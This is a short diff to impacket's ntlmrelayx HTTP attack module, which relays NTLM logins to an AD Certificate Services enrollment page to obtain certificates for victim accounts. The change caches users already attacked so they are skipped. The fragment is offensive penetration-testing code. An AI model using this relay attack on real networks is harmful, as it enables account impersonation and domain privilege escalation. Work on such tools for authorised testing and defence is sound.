@@ -21,6 +21,9 @@ from OpenSSL import crypto
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
 
 PROTOCOL_ATTACK_CLASS = "HTTPAttack"
+# cache already attacked clients
+ELEVATED = []
+
 
 class HTTPAttack(ProtocolAttack):
     """
@@ -62,6 +65,9 @@ class HTTPAttack(ProtocolAttack):
         key = crypto.PKey()
         key.generate_key(crypto.TYPE_RSA, 4096)
 
+        if self.username in ELEVATED:
+            print('[*] Skipping user %s since attack was already performed' % self.username)
+            return
         csr = self.generate_csr(key, self.username)
         csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
         print("[*] CSR generated!")
@@ -77,6 +83,7 @@ class HTTPAttack(ProtocolAttack):
         print("[*] Getting certificate...")
 
         self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
+        ELEVATED.append(self.username)
         response = self.client.getresponse()
 
         if response.status != 200:
